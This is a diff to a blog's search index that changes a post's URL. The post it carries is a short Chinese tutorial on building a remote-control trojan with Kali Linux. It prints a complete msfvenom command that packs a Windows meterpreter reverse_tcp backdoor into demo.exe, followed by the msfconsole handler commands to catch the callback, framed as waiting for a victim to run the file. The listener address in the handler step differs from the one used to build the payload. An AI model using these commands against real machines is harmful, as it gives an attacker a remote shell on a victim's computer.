@@ -24,8 +24,8 @@
     
     <entry>
       <title>kali渗透工具制作木马病毒</title>
-      <link href="/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7metasploit%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/"/>
-      <url>/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7metasploit%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/</url>
+      <link href="/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/"/>
+      <url>/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/</url>
       
         <content type="html"><![CDATA[<h2 id="1、msfvenom生成远控木马"><a href="#1、msfvenom生成远控木马" class="headerlink" title="1、msfvenom生成远控木马"></a>1、msfvenom生成远控木马</h2><p>msfvenom是用来生成后门软件，在目标机上执行后门，在本地监听上线。(msfvenom在shell里使用，不是在msfconsole终端)</p>    <figure class="figure-image">      <img src="/picture/misc22.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <p>msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.88.123   lport=9999  -f  exe  -o   demo.exe<br>lhost攻击机的地址，lport：1~65535自己任选，不要选已在工作中的端口    </p><p>查询kali的ip地址<br>ifconfig或ip add</p>    <figure class="figure-image">      <img src="/picture/misc23.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc24.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>现在木马就生成好了</p>    <figure class="figure-image">      <img src="/picture/misc25.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>再点击open folder就可以看到demo.exe了</p><h2 id="2、开启监听"><a href="#2、开启监听" class="headerlink" title="2、开启监听"></a>2、开启监听</h2><p>在msfconsole中开启监听，等待受害者运行上钩<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.169.88.123  (注意空格不要多输)<br>set lport 9999<br>run</p>]]></content>
       
